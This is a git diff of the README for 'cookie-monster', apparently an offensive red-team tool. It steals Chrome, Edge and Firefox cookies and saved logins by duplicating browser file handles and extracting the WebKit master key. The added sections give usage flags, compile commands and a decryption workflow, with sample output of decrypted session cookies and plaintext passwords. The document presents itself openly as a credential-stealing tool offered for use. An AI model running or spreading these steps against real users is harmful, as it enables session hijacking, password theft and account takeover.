@@ -1,22 +1,27 @@
 # cookie-monster
 Steal browser cookies for edge, chrome and firefox through a BOF or exe! 
-Cookie-Monster will extract the WebKit master key, locate a browser process with a handle to the COOKIES file, copy the handle and then fileless download the COOKIES.  
+Cookie-Monster will extract the WebKit master key, locate a browser process with a handle to the Cookies and Login Data files, copy the handle(s) and then fileless download the target.
+Once the Cookies/Login Data file(s) are downloaded, the python decryption script can help extract those secrets!  
 
 ## BOF Usage
 ```
-Usage: cookie-monster [ --chrome || --edge || --firefox || --chromepid <pid> || --edgepid <pid> ] 
+Usage: cookie-monster [ --chrome || --edge || --firefox || --chromeCookiePID <pid> || --chromeLoginDataPID <PID> || --edgeCookiePID <pid> || --edgeLoginDataPID <pid>] 
 cookie-monster Example: 
    cookie-monster --chrome 
    cookie-monster --edge 
    cookie-moster --firefox 
-   cookie-monster --chromepid 1337 
-   cookie-monster --edgepid 4444 
+   cookie-monster --chromeCookiePID 1337
+   cookie-monster --chromeLoginDataPID 1337
+   cookie-monster --edgeCookiePID 4444
+   cookie-monster --edgeLoginDataPID 4444
 cookie-monster Options: 
-    --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to cookies and then copies the file to the CWD 
-    --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to cookies and then copies the file to the CWD 
+    --chrome, looks at all running processes and handles, if one matches chrome.exe it copies the handle to Cookies/Login Data and then copies the file to the CWD 
+    --edge, looks at all running processes and handles, if one matches msedge.exe it copies the handle to Cookies/Login Data and then copies the file to the CWD 
     --firefox, looks for profiles.ini and locates the key4.db and logins.json file 
-    --chromepid, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and cookie file 
-    --edgepid, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and cookie file 
+    --chromeCookiePID, if chrome PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file
+    --chromeLoginDataPID, if chrome PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file  
+    --edgeCookiePID, if edge PID is provided look for the specified process with a handle to cookies is known, specifiy the pid to duplicate its handle and file
+    --edgeLoginDataPID, if edge PID is provided look for the specified process with a handle to Login Data is known, specifiy the pid to duplicate its handle and file  
 ```
 
 ## EXE usage
@@ -26,10 +31,51 @@ Cookie Monster Example:
 Cookie Monster Options:
   -h, --help                     Show this help message and exit
   --all                          Run chrome, edge, and firefox methods
-  --edge                         Extract edge keys and download cookies file to PWD
-  --chrome                       Extract chrome keys and download cookies file to PWD
+  --edge                         Extract edge keys and download Cookies/Login Data file to PWD
+  --chrome                       Extract chrome keys and download Cookies/Login Data file to PWD
   --firefox                      Locate firefox key and Cookies, does not make a copy of either file
 ```
+## Decryption Steps
+Install requirements
+```
+pip3 install -r requirements.txt
+```
+
+Base64 encode the webkit masterkey
+``` 
+python3 base64-encode.py "\xec\xfc...."
+```
+
+Decrypt Cookies File
+```
+python .\decrypt.py "XHh..." --cookies ChromeCookie.db
+
+Results Example:
+-----------------------------------
+Host: .github.com
+Path: /
+Name: dotcom_user
+Cookie: KingOfTheNOPs
+Expires: Oct 28 2024 21:25:22
+
+Host: github.com
+Path: /
+Name: user_session
+Cookie: x123.....
+Expires: Nov 11 2023 21:25:22
+```
+
+Decrypt Passwords File
+```
+python .\decrypt.py "XHh..." --passwords ChromePasswords.db
+
+Results Example:
+-----------------------------------
+URL: https://test.com/
+Username: tester
+Password: McTesty
+```
+
 ## Installation
 Ensure Mingw-w64 and make is installed on the linux prior to compiling.
 ```
@@ -41,11 +87,15 @@ to compile exe on windows
 gcc .\cookie-monster.c -o cookie-monster.exe -lshlwapi -lcrypt32
 ```
 
+### TO-DO
+- update decryption for firefox
+
 ## References
 This project could not have been done without the help of Mr-Un1k0d3r and his amazing seasonal videos!
 Highly recommend checking out his lessons!!! <br>
 Cookie Webkit Master Key Extractor:
 https://github.com/Mr-Un1k0d3r/Cookie-Graber-BOF <br>
 Fileless download:
-https://github.com/fortra/nanodump
-
+https://github.com/fortra/nanodump <br>
+Decrypt Cookies and Login Data:
+https://github.com/login-securite/DonPAPI
